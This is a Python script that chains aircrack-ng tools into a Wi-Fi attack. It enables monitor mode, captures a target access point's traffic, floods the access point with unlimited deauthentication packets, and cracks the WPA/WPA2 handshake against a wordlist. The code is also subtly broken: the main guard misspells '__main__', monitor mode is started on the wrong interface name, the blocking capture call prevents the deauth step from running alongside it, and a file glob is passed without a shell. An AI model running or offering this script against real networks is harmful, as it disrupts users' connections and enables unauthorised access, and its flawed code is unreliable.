import subprocess

def start_monitor_mode(interface):
    subprocess.run(['sudo', 'airmon-ng', 'start', interface])

def list_networks(interface):
    subprocess.run(['sudo', 'airodump-ng', interface])

def capture_packets(interface, bssid, channel, output_file):
    subprocess.run(['sudo', 'airodump-ng', '--bssid', bssid, '--channel', channel, '--write', output_file, interface])

def deauth_attack(interface, bssid):
    subprocess.run(['sudo', 'aireplay-ng', '--deauth', '0', '-a', bssid, interface])

def crack_wpa(output_file, wordlist, bssid):
    subprocess.run(['sudo', 'aircrack-ng', '-w', wordlist, '-b', bssid, output_file])

if __name__ == "_main_":
                interface = "wlan0"
                start_monitor_mode(interface + "mon")

                print("Listing available networks...")
                list_networks(interface + "mon")

                # Replace these with your network's BSSID and channel for testing purposes
                test_bssid = "00:11:22:33:44:55"
                test_channel = "6"
                output_file = "capture"

                print("Capturing packets...")
                capture_packets(interface + "mon", test_bssid, test_channel, output_file)

                print("Performing deauthentication attack...")
                deauth_attack(interface + "mon", test_bssid)

                # Replace with the path to your wordlist for testing WPA/WPA2 cracking
                wordlist = "/path/to/wordlist.txt"
                print("Cracking WPA/WPA2...")
                crack_wpa(output_file + "*.cap", wordlist, test_bssid)